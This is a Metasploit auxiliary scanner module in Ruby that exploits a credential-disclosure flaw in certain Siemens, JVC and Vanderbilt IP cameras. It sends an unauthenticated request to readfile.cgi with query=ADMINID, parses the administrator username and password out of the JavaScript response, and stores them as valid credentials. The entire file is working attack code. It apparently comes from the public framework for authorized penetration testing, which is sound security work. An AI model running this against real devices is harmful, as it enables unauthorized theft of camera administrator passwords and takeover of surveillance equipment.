##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'         => 'JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure',
      'Description'  => %q{
        SIEMENS IP-Camera (CVMS2025-IR + CCMS2025), JVC IP-Camera (VN-T216VPRU),
        and Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR)
        allow an unauthenticated user to disclose the username & password by
        requesting the javascript page 'readfile.cgi?query=ADMINID'.
        Siemens firmwares affected: x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235
      },
      'References'   =>
        [
          ['EDB', '40254'],
          ['EDB', '40263'],
          ['EDB', '40264']
        ],
      'Author'       =>
        [
          'Yakir Wizman', # discovery
          'h00die',    # module
        ],
      'License'      => MSF_LICENSE,
      'DisclosureDate' => 'Aug 16 2016'
    )

    register_options([
      OptString.new('TARGETURI', [false, 'URL of the IP-Camera root', '/'])
    ])
  end

  def run_host(rhost)
    begin
      url = normalize_uri(datastore['TARGETURI'], 'cgi-bin', 'readfile.cgi')
      vprint_status("Attempting to load data from #{url}?query=ADMINID")
      res = send_request_cgi({
        'uri'      => url,
        'vars_get' => {'query'=>'ADMINID'}
      })
      unless res
        print_error("#{peer} Unable to connect to #{url}")
        return
      end

      unless res.body.include?('Adm_ID=')
        print_error("Invalid response received for #{peer} for #{url}")
        return
      end

      if res.body =~ /var Adm_ID="(.+?)";\s+var Adm_Pass1="(.+?)";/
        print_good("Found: #{$1}:#{$2}")
        store_valid_credential(
          user:         $1,
          private:      $2,
          private_type: :password
        )
      end
    rescue ::Rex::ConnectionError
      print_error("#{peer} Unable to connect to site")
      return
    end
  end
end
